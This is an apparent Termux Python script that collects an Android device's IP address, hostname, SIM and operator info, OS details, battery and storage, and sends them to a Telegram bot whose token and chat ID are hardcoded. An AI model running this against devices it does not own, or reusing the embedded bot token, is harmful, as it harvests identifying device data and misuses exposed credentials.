import os
import requests
import socket

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to gather device info
def get_device_info():
    try:
        # Get IP address
        ip_address = requests.get('https://api.ipify.org').text
        
        # Get device hostname
        device_name = socket.gethostname()
        
        # Get SIM info (Termux-specific command)
        sim_info = os.popen('termux-telephony-cellinfo').read().strip()

        # Get operator info (Termux-specific command)
        operator_info = os.popen('termux-telephony-deviceinfo').read().strip()

        # Get system info
        os_info = os.popen('uname -a').read().strip()

        # Get battery info
        battery_info = os.popen('termux-battery-status').read().strip()

        # Get storage info
        storage_info = os.popen('df -h /data').read().strip()

        # Prepare message to send
        message = (
            f"*Device Info*\n"
            f"IP Address: `{ip_address}`\n"
            f"Device Name: `{device_name}`\n"
            f"SIM Info: `{sim_info}`\n"
            f"Operator Info: `{operator_info}`\n"
            f"OS Info: `{os_info}`\n"
            f"Battery Info: `{battery_info}`\n"
            f"Storage Info: `{storage_info}`"
        )

        # Send the collected info to Telegram
        send_to_telegram(message)

    except Exception as e:
        print(f"Error getting device info: {str(e)}")

if __name__ == "__main__":
    get_device_info()
